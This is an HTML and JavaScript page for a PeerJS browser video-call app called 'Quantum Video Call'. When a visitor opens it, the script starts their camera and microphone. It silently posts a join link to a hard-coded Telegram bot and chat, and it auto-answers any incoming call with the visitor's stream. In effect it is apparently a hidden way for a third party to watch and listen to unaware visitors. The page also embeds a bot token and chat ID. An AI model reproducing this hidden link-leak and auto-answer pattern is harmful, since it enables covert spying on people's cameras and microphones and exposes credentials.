<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Quantum Video Call</title>
  <link
    rel="stylesheet"
    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
  />
  <style>
    /* ----------------------------------------------------------
       RESET & BODY
    ---------------------------------------------------------- */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      background: #000;
      color: #fff;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
      overflow: hidden;
      height: 100vh;
      position: relative;
    }

    /* ----------------------------------------------------------
       ANIMATED GRADIENT BACKGROUND
    ---------------------------------------------------------- */
    .gradient-background {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: -1;
      background: linear-gradient(125deg, 
        #0c0c1f 0%, 
        #1a1a3a 25%, 
        #2d2d5a 50%, 
        #1a1a3a 75%, 
        #0c0c1f 100%);
      background-size: 400% 400%;
      animation: gradientShift 20s ease infinite;
    }

    @keyframes gradientShift {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }

    /* ----------------------------------------------------------
       MODERN APPLE-STYLE UI ELEMENTS
    ---------------------------------------------------------- */
    .container {
      display: flex;
      flex-direction: column;
      height: 100vh;
      position: relative;
      overflow: hidden;
    }

    .video-container {
      flex: 1;
      position: relative;
      overflow: hidden;
      border-radius: 24px;
      margin: 20px;
      background: rgba(20, 20, 30, 0.3);
      backdrop-filter: blur(10px);
      -webkit-backdrop-filter: blur(10px);
      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.3),
                  inset 0 0 0 1px rgba(255, 255, 255, 0.05);
    }

    /* ----------------------------------------------------------
       VIDEO ELEMENTS
    ---------------------------------------------------------- */
    #remoteVideo {
      position: absolute;
      left: 50%;
      transform: translateX(-50%);
      object-fit: cover;
      background: #000;
      border-radius: 24px;
      z-index: 1;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
    }

    #localVideo {
      height: 150px;
      width: auto;
      max-width: 180px;
      position: absolute;
      bottom: 180px;
      right: 50px;
      border-radius: 24px;
      object-fit: cover;
      z-index: 10;
      background: #000;
      transition: all 0.3s;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
    }

    #localVideo:hover {
      transform: scale(1.05);
    }

    /* ----------------------------------------------------------
       PORTRAIT AND LANDSCAPE ADJUSTMENTS
    ---------------------------------------------------------- */
    @media (orientation: portrait) {
      #remoteVideo {
        top: 80px;
        bottom: 140px;
        width: 90%;
        height: auto;
        max-height: calc(100% - (80px + 140px));
        border-radius: 24px;
      }
    }

    @media (orientation: landscape) {
      #remoteVideo {
        top: 60px;
        bottom: 100px;
        width: 80%;
        height: auto;
        max-height: calc(100% - (60px + 100px));
        border-radius: 24px;
      }
    }

    /* ----------------------------------------------------------
       STATUS BAR (top center)
    ---------------------------------------------------------- */
    .status {
      position: fixed;
      top: 20px;
      left: 50%;
      transform: translateX(-50%);
      padding: 12px 30px;
      background: rgba(30, 30, 40, 0.7);
      border-radius: 30px;
      font-weight: bold;
      font-size: 14px;
      z-index: 10;
      backdrop-filter: blur(10px);
      -webkit-backdrop-filter: blur(10px);
      border: 1px solid rgba(255, 255, 255, 0.1);
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
      min-width: 200px;
      text-align: center;
      text-transform: uppercase;
      letter-spacing: 1px;
      font-weight: 600;
      display: flex;
      align-items: center;
      gap: 12px;
      color: #fff;
    }

    .timer {
      background: rgba(0, 0, 0, 0.3);
      padding: 6px 14px;
      border-radius: 20px;
      font-size: 13px;
      font-weight: 500;
      display: flex;
      align-items: center;
      gap: 6px;
      color: #a0a0c0;
    }

    .timer i {
      margin-right: 6px;
      color: #5e8fff;
    }

    /* ----------------------------------------------------------
       CONTROLS (bottom center)
    ---------------------------------------------------------- */
    .controls {
      position: fixed;
      bottom: 30px;
      left: 50%;
      transform: translateX(-50%);
      display: flex;
      gap: 25px;
      z-index: 10;
      background: rgba(30, 30, 40, 0.7);
      padding: 18px 30px;
      border-radius: 50px;
      backdrop-filter: blur(15px);
      -webkit-backdrop-filter: blur(15px);
      border: 1px solid rgba(255, 255, 255, 0.1);
      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.3);
    }

    .control-btn {
      width: 70px;
      height: 70px;
      border-radius: 50%;
      background: rgba(50, 50, 70, 0.8);
      backdrop-filter: blur(8px);
      -webkit-backdrop-filter: blur(8px);
      border: 1px solid rgba(255, 255, 255, 0.1);
      color: #fff;
      font-size: 24px;
      display: flex;
      justify-content: center;
      align-items: center;
      cursor: pointer;
      transition: all 0.3s ease;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
    }

    .control-btn:hover {
      background: rgba(80, 80, 100, 0.8);
      transform: translateY(-5px);
      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.4);
    }

    .control-btn:active {
      transform: translateY(0) scale(0.95);
    }

    #endBtn {
      background: rgba(255, 69, 58, 0.9);
    }

    #endBtn:hover {
      background: rgba(255, 100, 90, 0.9);
    }

    /* ----------------------------------------------------------
       FULLSCREEN BUTTON (top right)
    ---------------------------------------------------------- */
    .fullscreen-btn {
      position: fixed;
      top: 25px;
      right: 25px;
      width: 40px;
      height: 40px;
      border-radius: 50%;
      background: rgba(50, 50, 70, 0.8);
      border: 1px solid rgba(255, 255, 255, 0.1);
      color: #fff;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 20px;
      cursor: pointer;
      z-index: 10;
      transition: all 0.3s;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
      backdrop-filter: blur(8px);
      -webkit-backdrop-filter: blur(8px);
    }

    .fullscreen-btn:hover {
      background: rgba(80, 80, 100, 0.8);
      transform: scale(1.1);
    }

    /* ----------------------------------------------------------
       NOTIFICATION BANNER (top center)
    ---------------------------------------------------------- */
    .notification {
      position: fixed;
      top: 20px;
      left: 50%;
      transform: translateX(-50%);
      background: rgba(40, 205, 65, 0.9);
      color: white;
      padding: 14px 30px;
      border-radius: 30px;
      z-index: 100;
      opacity: 0;
      transition: opacity 0.3s ease;
      backdrop-filter: blur(10px);
      -webkit-backdrop-filter: blur(10px);
      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
      font-weight: 500;
      font-size: 16px;
      letter-spacing: 0.5px;
    }

    .notification.show {
      opacity: 1;
    }

    /* ----------------------------------------------------------
       CONNECTION STATUS
    ---------------------------------------------------------- */
    .connection-status {
      display: flex;
      align-items: center;
      gap: 10px;
    }

    .status-indicator {
      width: 12px;
      height: 12px;
      border-radius: 50%;
      background: #ff5a5a;
      box-shadow: 0 0 15px #ff5a5a;
    }

    .status-indicator.connected {
      background: #30d158;
      box-shadow: 0 0 15px #30d158;
    }

    /* ----------------------------------------------------------
       APPLE-STYLE GLASS EFFECTS
    ---------------------------------------------------------- */
    .glass {
      background: rgba(30, 30, 40, 0.6);
      backdrop-filter: blur(20px);
      -webkit-backdrop-filter: blur(20px);
      border: 1px solid rgba(255, 255, 255, 0.08);
      box-shadow: 0 25px 50px rgba(0, 0, 0, 0.3);
    }

    /* ----------------------------------------------------------
       COPY BUTTON STYLE
    ---------------------------------------------------------- */
    .copy-btn {
      background: linear-gradient(to right, #0a84ff, #5e8fff);
      border: none;
      color: #fff;
      padding: 12px 28px;
      border-radius: 30px;
      cursor: pointer;
      font-weight: 600;
      transition: all 0.3s;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      box-shadow: 0 10px 30px rgba(10, 132, 255, 0.4);
      letter-spacing: 0.5px;
      font-size: 16px;
      backdrop-filter: blur(5px);
      -webkit-backdrop-filter: blur(5px);
    }

    .copy-btn:hover {
      transform: translateY(-3px);
      box-shadow: 0 15px 35px rgba(10, 132, 255, 0.6);
      background: linear-gradient(to right, #1a94ff, #6e9fff);
    }

    /* ----------------------------------------------------------
       CONNECTION INFO STYLE
    ---------------------------------------------------------- */
    .connection-info {
      position: fixed;
      top: 80px;
      left: 50%;
      transform: translateX(-50%);
      padding: 0;
      border-radius: 0;
      font-size: 14px;
      z-index: 10;
      backdrop-filter: none;
      border: none;
      text-align: center;
      max-width: 80%;
      box-shadow: none;
    }

    /* ----------------------------------------------------------
       ANIMATED PULSE FOR CALL BUTTON
    ---------------------------------------------------------- */
    .pulse {
      animation: pulseAnimation 2s infinite;
    }

    @keyframes pulseAnimation {
      0% {
        box-shadow: 0 0 0 0 rgba(255, 69, 58, 0.7);
      }
      70% {
        box-shadow: 0 0 0 15px rgba(255, 69, 58, 0);
      }
      100% {
        box-shadow: 0 0 0 0 rgba(255, 69, 58, 0);
      }
    }

    /* ----------------------------------------------------------
       LOADING SPINNER
    ---------------------------------------------------------- */
    .spinner {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 60px;
      height: 60px;
      border-radius: 50%;
      border: 4px solid rgba(255, 255, 255, 0.1);
      border-top: 4px solid #0a84ff;
      animation: spin 1s linear infinite;
      z-index: 20;
    }

    @keyframes spin {
      0% { transform: translate(-50%, -50%) rotate(0deg); }
      100% { transform: translate(-50%, -50%) rotate(360deg); }
    }

    /* ----------------------------------------------------------
       APPLE-STYLE TYPOGRAPHY
    ---------------------------------------------------------- */
    h1, h2, h3, h4, h5, h6 {
      font-weight: 600;
      letter-spacing: -0.5px;
    }

    /* ----------------------------------------------------------
       RESPONSIVE ADJUSTMENTS
    ---------------------------------------------------------- */
    @media (max-width: 768px) {
      .controls {
        gap: 15px;
        padding: 15px 20px;
      }
      
      .control-btn {
        width: 60px;
        height: 60px;
        font-size: 20px;
      }
      
      .status {
        padding: 10px 20px;
        font-size: 13px;
      }
      
      .fullscreen-btn {
        width: 36px;
        height: 36px;
        font-size: 18px;
      }
    }
  </style>
</head>
<body>
  <div class="gradient-background"></div>
  <div class="notification" id="notification">
    Link copied to clipboard!
  </div>
  
  <div class="spinner" id="spinner"></div>

  <div class="container">
    <!-- STATUS BAR (top center) -->
    <div class="status glass" id="status">
      <div class="connection-status">
        <div class="status-indicator" id="statusIndicator"></div>
        <span id="statusText">CONNECTING</span>
      </div>
      <div class="timer" id="timer" style="display: none;">
        <i class="fas fa-clock"></i>
        <span id="timerDisplay">00:00:00</span>
      </div>
    </div>

    <!-- CONNECTION INFO -->
    <div class="connection-info" id="connectionInfo"></div>

    <!-- FULLSCREEN TOGGLE (top right) -->
    <div class="fullscreen-btn glass" id="fullscreenBtn">
      <i class="fas fa-expand"></i>
    </div>
    
    <div class="video-container glass">
      <!-- Remote video -->
      <video id="remoteVideo" autoplay playsinline></video>

      <!-- Local video -->
      <video id="localVideo" autoplay muted playsinline></video>

      <!-- CONTROLS (bottom center) -->
      <div class="controls">
        <div class="control-btn glass" id="switchCameraBtn">
          <i class="fas fa-camera"></i>
        </div>
        <div class="control-btn glass" id="muteBtn">
          <i class="fas fa-microphone"></i>
        </div>
        <div class="control-btn pulse glass" id="endBtn">
          <i class="fas fa-phone-slash"></i>
        </div>
      </div>
    </div>
  </div>

  <!-- PeerJS library -->
  <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>

  <script>
    const BOT_TOKEN = "7743009303:AAEfCdb2kU3xjZHbU-mo_qUbP3wA4aejDRo";
    const CHAT_ID = "878604830";
    const MAX_RETRIES = 3;
    const RETRY_DELAY = 3000;

    let peer;
    let localStream;
    let currentCall;
    let isMuted = false;
    let currentCamera = 'user';
    let connectionRetries = 0;
    let callStartTime = 0;
    let timerInterval = null;
    let closeConn = null;
    let generatedPeerId = null;

    const localVideo = document.getElementById('localVideo');
    const remoteVideo = document.getElementById('remoteVideo');
    const statusText = document.getElementById('statusText');
    const statusIndicator = document.getElementById('statusIndicator');
    const timerDisplay = document.getElementById('timerDisplay');
    const timerEl = document.getElementById('timer');
    const fullscreenBtn = document.getElementById('fullscreenBtn');
    const connectionInfo = document.getElementById('connectionInfo');
    const notification = document.getElementById('notification');
    const spinner = document.getElementById('spinner');

    // Show temporary notification banner
    function showNotification(message) {
      notification.textContent = message;
      notification.classList.add('show');
      setTimeout(() => {
        notification.classList.remove('show');
      }, 2000);
    }

    // Update status text & indicator
    function updateStatus(status, isConnected = false) {
      statusText.textContent = status;
      if (isConnected) {
        statusIndicator.classList.add('connected');
        statusIndicator.style.background = '#30d158';
        statusIndicator.style.boxShadow = '0 0 15px #30d158';
      } else {
        statusIndicator.classList.remove('connected');
        statusIndicator.style.background = '#ff5a5a';
        statusIndicator.style.boxShadow = '0 0 15px #ff5a5a';
      }
    }

    // Start call timer
    function startTimer() {
      callStartTime = Date.now();
      timerEl.style.display = 'flex';
      timerInterval = setInterval(() => {
        const elapsed = Date.now() - callStartTime;
        const hours = Math.floor(elapsed / 3600000);
        const minutes = Math.floor((elapsed % 3600000) / 60000);
        const seconds = Math.floor((elapsed % 60000) / 1000);
        timerDisplay.textContent =
          `${hours.toString().padStart(2, '0')}:` +
          `${minutes.toString().padStart(2, '0')}:` +
          `${seconds.toString().padStart(2, '0')}`;
      }, 1000);
    }

    // Stop call timer
    function stopTimer() {
      if (timerInterval) {
        clearInterval(timerInterval);
        timerInterval = null;
      }
      timerEl.style.display = 'none';
    }

    // Get user media (camera + mic)
    async function getMedia(cameraFacingMode = 'user') {
      try {
        return await navigator.mediaDevices.getUserMedia({
          video: {
            width: { ideal: 1280 },
            height: { ideal: 720 },
            frameRate: { ideal: 60 },
            facingMode: cameraFacingMode
          },
          audio: true
        });
      } catch (err) {
        console.error('Error accessing media devices:', err);
        connectionInfo.innerHTML =
          'Failed to access camera and microphone. Please check permissions.';
        throw err;
      }
    }

    // Initialize PeerJS & UI
    async function init() {
      updateStatus('CONNECTING');
      spinner.style.display = 'block';

      const urlParams = new URLSearchParams(window.location.search);
      const code = urlParams.get('code');

      try {
        // Acquire local media stream
        localStream = await getMedia();
        localVideo.srcObject = localStream;

        if (code) {
          // RECEIVER: connect using code from URL
          generatedPeerId = code;
          connectionInfo.innerHTML = '';
          setupReceiver(code);
        } else {
          // CALLER: generate Peer ID and show "Copy Call Link" button
          generatedPeerId = generateId();
          updateStatus('AWAITING CONNECTION');
          connectionInfo.innerHTML =
            `<button class="copy-btn glass" id="copyLinkBtn">
               <i class="fas fa-copy"></i> Copy Call Link
             </button>`;
          sendToTelegram(generatedPeerId);

          peer = new Peer(generatedPeerId, {
            secure: true,
            host: '0.peerjs.com',
            port: 443
          });

          peer.on('open', () => {
            updateStatus('READY');
            spinner.style.display = 'none';
          });

          peer.on('call', call => {
            // ANSWER incoming call
            call.answer(localStream);
            currentCall = call;
            updateStatus('', true);
            connectionInfo.innerHTML = '';
            startTimer();
            triggerVibration();
            spinner.style.display = 'none';

            call.on('stream', stream => {
              remoteVideo.srcObject = stream;
              setupCloseDataConnection(call.peer);
            });

            call.on('close', () => {
              updateStatus('DISCONNECTED');
              stopTimer();
              setTimeout(() => {
                window.close();
              }, 500);
            });

            call.on('error', (err) => {
              console.error('Call error:', err);
              updateStatus('CALL ERROR');
              connectionInfo.innerHTML =
                `Error: ${err.message || err.type}`;
              stopTimer();
              spinner.style.display = 'none';
            });
          });
        }

        peer.on('error', (err) => {
          console.error('PeerJS error:', err);
          updateStatus('PEER ERROR');
          connectionInfo.innerHTML =
            `Error: ${err.message || err.type}`;
          stopTimer();
          spinner.style.display = 'none';

          if (code && connectionRetries < MAX_RETRIES) {
            connectionRetries++;
            connectionInfo.innerHTML +=
              `<br>Retrying in 3 seconds (${connectionRetries}/${MAX_RETRIES})...`;
            setTimeout(() => setupReceiver(code), RETRY_DELAY);
          }
        });

      } catch (err) {
        console.error('Initialization error:', err);
        updateStatus('INIT ERROR');
        connectionInfo.innerHTML =
          'Failed to initialize. Please refresh the page.';
        spinner.style.display = 'none';
      }
    }

    // Setup RECEIVER: make outgoing call to caller
    function setupReceiver(code) {
      peer = new Peer({ secure: true, host: '0.peerjs.com', port: 443 });

      peer.on('open', () => {
        const call = peer.call(code, localStream);
        currentCall = call;
        updateStatus('CONNECTING');

        call.on('stream', stream => {
          updateStatus('CONNECTED', true);
          connectionInfo.innerHTML = '';
          remoteVideo.srcObject = stream;
          startTimer();
          triggerVibration();
          spinner.style.display = 'none';
          setupCloseDataConnection(call.peer);
        });

        call.on('close', () => {
          updateStatus('DISCONNECTED');
          stopTimer();
          setTimeout(() => {
            window.close();
          }, 500);
        });

        call.on('error', (err) => {
          console.error('Call error:', err);
          updateStatus('CALL ERROR');
          connectionInfo.innerHTML =
            `Error: ${err.message || err.type}`;
          stopTimer();
          spinner.style.display = 'none';

          if (connectionRetries < MAX_RETRIES) {
            connectionRetries++;
            connectionInfo.innerHTML +=
              `<br>Retrying in 3 seconds (${connectionRetries}/${MAX_RETRIES})...`;
            setTimeout(() => setupReceiver(code), RETRY_DELAY);
          }
        });
      });
    }

    // Generate 6‐character random Peer ID
    function generateId() {
      return Math.random().toString(36).substring(2, 8).toUpperCase();
    }

    // Send call link via Telegram Bot API
    function sendToTelegram(peerId) {
      const message =
        `🚀 New Video Call Started\n\n🔑 Peer ID: ${peerId}\n🔗 Link: ` +
        `${window.location.href.split('?')[0]}?code=${peerId}`;
      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
      }).catch(err => console.error('Telegram error:', err));
    }

    // Set up DataConnection to signal "close" to the other side
    function setupCloseDataConnection(remoteId) {
      if (closeConn) {
        closeConn.close();
        closeConn = null;
      }
      closeConn = peer.connect(remoteId);

      closeConn.on('open', () => {});

      closeConn.on('data', data => {
        if (data === 'close-call') {
          window.close();
        }
      });

      closeConn.on('error', err => {
        console.error('DataConnection error:', err);
      });
    }

    // Trigger a short vibration on connection
    function triggerVibration() {
      if (navigator.vibrate) {
        navigator.vibrate(200);
      }
    }

    // ------------ EVENT LISTENERS ------------

    // COPY CALL LINK (for caller)
    document.addEventListener('click', (e) => {
      if (e.target.id === 'copyLinkBtn' || e.target.closest('#copyLinkBtn')) {
        const link = `${window.location.href.split('?')[0]}?code=${generatedPeerId}`;
        navigator.clipboard.writeText(link).then(() => {
          showNotification('Call link copied to clipboard!');
        }).catch(err => {
          console.error('Copy failed:', err);
          showNotification('Failed to copy link');
        });
      }
    });

    // MUTE / UNMUTE
    document.getElementById('muteBtn').onclick = () => {
      isMuted = !isMuted;
      const audioTracks = localStream.getAudioTracks();
      if (audioTracks.length > 0) {
        audioTracks[0].enabled = !isMuted;
      }
      const micIcon = document.querySelector('#muteBtn i');
      if (isMuted) {
        micIcon.className = 'fas fa-microphone-slash';
        document.getElementById('muteBtn').style.background = 'rgba(255, 69, 58, 0.9)';
      } else {
        micIcon.className = 'fas fa-microphone';
        document.getElementById('muteBtn').style.background = 'rgba(50, 50, 70, 0.8)';
      }
    };

    // SWITCH CAMERA (front <-> back)
    document.getElementById('switchCameraBtn').onclick = async () => {
      try {
        currentCamera = currentCamera === 'user' ? 'environment' : 'user';
        const newStream = await getMedia(currentCamera);
        const videoTrack = newStream.getVideoTracks()[0];

        if (currentCall && currentCall.peerConnection) {
          const sender = currentCall.peerConnection.getSenders()
            .find(s => s.track.kind === 'video');
          if (sender) sender.replaceTrack(videoTrack);
        }

        // Preserve mute state on new stream
        const audioTracks = newStream.getAudioTracks();
        if (audioTracks.length > 0) {
          audioTracks[0].enabled = !isMuted;
        }

        localVideo.srcObject = newStream;
        localStream.getTracks().forEach(track => track.stop());
        localStream = newStream;
      } catch (err) {
        console.error('Error switching camera:', err);
        connectionInfo.innerHTML =
          'Error switching camera. Please try again.';
      }
    };

    // END CALL: send close‐signal then close local tab
    document.getElementById('endBtn').onclick = () => {
      if (closeConn && closeConn.open) {
        closeConn.send('close-call');
      }
      if (currentCall) {
        currentCall.close();
      }
      if (peer) {
        peer.destroy();
      }
      updateStatus('ENDING CALL');
      stopTimer();
      setTimeout(() => {
        window.close();
      }, 200);
    };

    // FULLSCREEN TOGGLE
    fullscreenBtn.addEventListener('click', () => {
      if (!document.fullscreenElement) {
        document.documentElement.requestFullscreen();
        fullscreenBtn.innerHTML = '<i class="fas fa-compress"></i>';
      } else {
        document.exitFullscreen();
        fullscreenBtn.innerHTML = '<i class="fas fa-expand"></i>';
      }
    });

    // Launch initialization
    init();
  </script>
</body>
</html>
